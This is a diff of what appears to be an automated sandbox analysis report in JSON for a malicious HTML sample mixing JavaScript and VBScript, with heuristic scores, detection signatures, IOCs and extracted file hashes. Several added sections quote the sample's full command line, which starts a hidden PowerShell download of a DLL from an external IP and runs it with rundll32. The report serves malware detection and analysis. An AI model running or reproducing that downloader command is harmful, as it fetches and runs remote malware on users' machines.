@@ -1,8 +1,54 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 121,
+    "score": 1383,
     "sections": [
+      {
+        "auto_collapse": false,
+        "body": "Sample uses unusual ShortCut objects",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 9,
+          "score": 100,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "ShortCut usage",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Sample uses a combination of both Visual Basic and JavaScript",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 12,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "behavior": [
+              "Visual Basic and JavaScript"
+            ]
+          }
+        },
+        "title_text": "Visual Basic and JavaScript",
+        "zeroize_on_tag_safe": false
+      },
       {
         "auto_collapse": true,
         "body": null,
@@ -85,6 +131,54 @@
       },
       {
         "auto_collapse": false,
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]()",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "creates_wsh_object": 10
+          },
+          "signatures": {
+            "creates_wsh_object": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: CreatesWshObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Object(s) are written to the DOM\n\t\tdocument[6].write(content) 1224 bytes",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "document_write": 10
+          },
+          "signatures": {
+            "document_write": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: DocumentWrite",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
         "body": "JavaScript uses parseInt to convert a string to an integer\n\t\tacApqOPr += String.fromCharCode(parseInt(aJQDXq.substr(anhBObj9, 2), 16))",
         "body_config": {},
         "body_format": "TEXT",
@@ -109,6 +203,102 @@
       },
       {
         "auto_collapse": false,
+        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\tws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\\\...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_cmd_prompt": 10
+          },
+          "signatures": {
+            "runs_cmd_prompt": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsCommandPrompt",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 ...\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\tws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\\\...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_ps1": 10
+          },
+          "signatures": {
+            "runs_ps1": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsPowerShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs PowerShell to call out to a URI\n\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 ...\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[20](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\tws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\\\...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_ps1_to_download": 10
+          },
+          "signatures": {
+            "runs_ps1_to_download": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: PowerShellDownloader",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[16].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_shell": 10
+          },
+          "signatures": {
+            "runs_shell": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
         "body": "JavaScript uses charCodeAt/fromCharCode to obfuscate/de-obfuscate characters\n\t\tacApqOPr += String.fromCharCode(parseInt(aJQDXq.substr(anhBObj9, 2), 16))",
         "body_config": {},
         "body_format": "TEXT",
@@ -129,6 +319,197 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: SuspiciousUseOfCharCodes",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "165.22.160.25",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://165.22.160.25/w9edb/160223",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/w9edb/160223",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 13,
+          "score": 500,
+          "score_map": {
+            "suspicious_pwsh_url": 500
+          },
+          "signatures": {
+            "suspicious_pwsh_url": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "dynamic": {
+              "ip": [
+                "165.22.160.25"
+              ],
+              "uri": [
+                "http://165.22.160.25/w9edb/160223"
+              ],
+              "uri_path": [
+                "/w9edb/160223"
+              ]
+            }
+          }
+        },
+        "title_text": "Suspicious URL Downloaded by PowerShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Suspicious JavaScript code found in HTML file",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 23,
+          "score": 100,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "document.write usage found in HTML",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "165.22.160.25",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://165.22.160.25/w9edb/160223",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/w9edb/160223",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "165.22.160.25"
+              ],
+              "uri": [
+                "http://165.22.160.25/w9edb/160223"
+              ],
+              "uri_path": [
+                "/w9edb/160223"
+              ]
+            }
+          }
+        },
+        "title_text": "MalwareJail extracted the following IOCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "165.22.160.25",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://165.22.160.25/w9edb/160223",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/w9edb/160223",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 13,
+          "score": 500,
+          "score_map": {
+            "wscript_cmd_url": 500
+          },
+          "signatures": {
+            "wscript_cmd_url": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\adeP1F.dll;start-process rundll32 %temp%\\adeP1F.dll N115"
+              ]
+            }
+          },
+          "network": {
+            "dynamic": {
+              "ip": [
+                "165.22.160.25"
+              ],
+              "uri": [
+                "http://165.22.160.25/w9edb/160223"
+              ],
+              "uri_path": [
+                "/w9edb/160223"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs extracted from WScript",
         "zeroize_on_tag_safe": false
       },
       {
@@ -158,15 +539,48 @@
         },
         "title_text": "JS-X-Ray IOCs Detected",
         "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Multiple rounds of tool runs were required due to nested document.write calls",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 15,
+          "score": 0,
+          "score_map": {
+            "dom_writes_equal_2": 0
+          },
+          "signatures": {
+            "dom_writes_equal_2": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Nested document.write calls",
+        "zeroize_on_tag_safe": false
       }
     ]
   },
   "files": {
-    "extracted": [],
+    "extracted": [
+      {
+        "name": "2H3UCl1xXaxvDHEVUheUkx.vbs",
+        "sha256": "d8fd4b98fcdaf3257c180b648ddcb0f18ad9afdef7b63e9b05eb39b0e362fb85"
+      },
+      {
+        "name": "extracted_wscript.ps1",
+        "sha256": "ddaf74fa67838c7a45c22c6fd43a4f268413e2cbd6c9f7e70a05681d7e05a86e"
+      }
+    ],
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "4d8fbc41d6f2ace5710612b839a0e2c61613d31fa092ef4fb48c4edfe2ddf279"
+        "sha256": "02264a15e5759e0a002ec14f6c5a6f60d37e6fdb30d8763efd4aaa84ee823e6d"
       }
     ]
   },
@@ -179,9 +593,56 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "creates_wsh_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "document_write"
+        ]
+      },
+      {
+        "attack_ids": [],
         "heur_id": 3,
         "signatures": [
           "parseint_usage"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_cmd_prompt"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_ps1"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_ps1_to_download"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell"
         ]
       },
       {
@@ -193,16 +654,137 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 9,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 12,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 13,
+        "signatures": [
+          "suspicious_pwsh_url"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 13,
+        "signatures": [
+          "wscript_cmd_url"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 15,
+        "signatures": [
+          "dom_writes_equal_2"
+        ]
+      },
+      {
+        "attack_ids": [],
         "heur_id": 22,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 23,
         "signatures": []
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\adeP1F.dll;start-process rundll32 %temp%\\adeP1F.dll N115"
+        }
+      ],
+      "file.behavior": [
+        {
+          "heur_id": 12,
+          "signatures": [],
+          "value": "Visual Basic and JavaScript"
+        }
+      ],
       "file.string.extracted": [
         {
           "heur_id": 2,
           "signatures": [],
           "value": "0d0a093c21444f43545950452048544d4c3e0d0a093c212d2d5b6966206c742049452037205d3e3c68746d6c206c616e673d..."
+        }
+      ],
+      "network.dynamic.ip": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "suspicious_pwsh_url"
+          ],
+          "value": "165.22.160.25"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "165.22.160.25"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "suspicious_pwsh_url"
+          ],
+          "value": "http://165.22.160.25/w9edb/160223"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "http://165.22.160.25/w9edb/160223"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "suspicious_pwsh_url"
+          ],
+          "value": "/w9edb/160223"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "/w9edb/160223"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "165.22.160.25"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://165.22.160.25/w9edb/160223"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/w9edb/160223"
         }
       ]
     },
